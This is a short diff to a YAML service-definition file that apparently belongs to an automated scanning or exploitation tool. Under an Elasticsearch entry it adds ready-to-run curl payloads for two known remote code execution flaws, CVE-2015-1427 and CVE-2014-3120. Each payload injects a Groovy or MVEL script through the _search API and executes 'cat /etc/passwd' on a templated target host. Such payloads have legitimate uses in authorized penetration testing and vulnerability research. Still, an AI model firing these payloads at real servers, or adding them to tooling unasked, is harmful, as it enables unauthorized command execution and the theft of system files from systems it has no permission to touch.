@@ -8,6 +8,12 @@ services:
     cve_patterns: ["script injection", "dynamic scripting", "groovy", "mvel"]
     exploit_hints: "Script injection via _search API, check /_search endpoint"
     probe_cmd: "curl http://{target}:9200"
+    # CVE-specific payloads
+    cve_payloads:
+      CVE-2015-1427: |
+        curl -XPOST 'http://{target}:9200/_search?pretty' -H 'Content-Type: application/json' -d '{"size":1,"script_fields":{"exec":{"script":"java.lang.Runtime.getRuntime().exec(\"cat /etc/passwd\").getText()"}}}'
+      CVE-2014-3120: |
+        curl -XPOST 'http://{target}:9200/_search?pretty' -H 'Content-Type: application/json' -d '{"script_fields":{"exec":{"script":"import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream()));while((s=br.readLine())!=null){str+=s+\"\\n\"};str"}}}'
 
   mongodb:
     port: 27017
